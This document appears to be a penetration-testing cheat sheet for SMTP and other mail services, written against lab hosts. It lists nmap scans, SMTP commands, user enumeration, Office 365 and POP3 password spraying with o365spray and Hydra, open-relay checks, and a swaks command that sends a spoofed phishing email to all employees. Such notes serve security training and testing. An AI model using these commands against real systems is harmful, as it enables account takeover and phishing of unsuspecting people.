1. Nmap
    1. `sudo nmap 10.129.14.128 -sC -sV -p25`
    2. `sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v`
2. Commands
```bash
AUTH PLAIN AUTH #is a service extension used to authenticate the client.                                  
HELO #The client logs in with its computer name and thus starts the session.                        
MAIL FROM #The client names the email sender.                                                            
RCPT TO #The client names the email recipient.                                                         
DATA #The client initiates the transmission of the email.                                           
RSET #The client aborts the initiated transmission but keeps the connection between client and server.|
VRFY #The client checks if a mailbox is available for message transfer.                             
EXPN #The client also checks if a mailbox is available for messaging with this command.             
NOOP #The client requests a response from the server to prevent disconnection due to time-out.      
USER # 
QUIT #The client terminates the session. 
```
## **All mail services**
1. Nmap scan: `sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128`
2.  smtp-user-enum: `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7`
3. O365 Spray: 
    1. `python3 o365spray.py --validate --domain msplaintext.xyz`
    2. `python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz `
4. Hydra - Password Attack: `hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3`
5. O365 Spray - Password Spraying: `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz`
6. Open Relay: `nmap -p25 -Pn --script smtp-open-relay 10.10.11.213`
7. use any mail client to connect to the mail server and send our email: `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213`